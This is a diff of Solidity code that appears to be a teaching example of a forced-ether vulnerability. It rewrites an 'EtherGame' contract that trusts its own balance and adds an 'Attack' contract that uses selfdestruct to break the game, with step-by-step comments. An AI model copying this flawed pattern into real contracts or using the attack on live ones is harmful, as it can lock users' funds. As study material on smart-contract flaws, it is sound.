@@ -1,39 +1,58 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+// The goal of this game is to be the 7th player to deposit 1 Ether.
+// Players can deposit only 1 Ether at a time.
+// Winner will be able to withdraw all Ether.
+
+/*
+1. Deploy EtherGame
+2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
+2. Deploy Attack with address of EtherGame
+3. Call Attack.attack sending 5 ether. This will break the game
+   No one can become the winner.
+
+What happened?
+Attack forced the balance of EtherGame to equal 7 ether.
+Now no one can deposit and the winner cannot be set.
+*/
+
 contract EtherGame {
+    uint public targetAmount = 7 ether;
+    address public winner;
 
-    uint public payoutMileStone1 = 3 ether;
-    uint public mileStone1Reward = 2 ether;
-    uint public payoutMileStone2 = 5 ether;
-    uint public mileStone2Reward = 3 ether;
-    uint public finalMileStone = 10 ether;
-    uint public finalReward = 5 ether;
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
 
-    mapping(address => uint) redeemableEther;
-    // users pay 0.5 ether. At specific milestones, credit their accounts
-    function play() public payable {
-        require(msg.value == 0.5 ether); // each play is 0.5 ether
-        uint currentBalance = this.balance + msg.value;
-        // ensure no players after the game as finished
-        require(currentBalance <= finalMileStone);
-        // if at a milestone credit the players account
-        if (currentBalance == payoutMileStone1) {
-            redeemableEther[msg.sender] += mileStone1Reward;
+        uint balance = address(this).balance;
+        require(balance <= targetAmount, "Game is over");
+
+        if (balance == targetAmount) {
+            winner = msg.sender;
         }
-        else if (currentBalance == payoutMileStone2) {
-            redeemableEther[msg.sender] += mileStone2Reward;
-        }
-        else if (currentBalance == finalMileStone ) {
-            redeemableEther[msg.sender] += finalReward;
-        }
-        return;
     }
 
     function claimReward() public {
-        // ensure the game is complete
-        require(this.balance == finalMileStone);
-        // ensure there is a reward to give
-        require(redeemableEther[msg.sender] > 0);
-        uint transferValue = redeemableEther[msg.sender];
-        redeemableEther[msg.sender] = 0;
-        msg.sender.transfer(transferValue);
+        require(msg.sender == winner, "Not winner");
+
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
     }
- }
+}
+
+contract Attack {
+    EtherGame etherGame;
+
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
+
+    function attack() public payable {
+        // You can simply break the game by sending ether so that
+        // the game balance >= 7 ether
+
+        // cast address to payable
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
+}
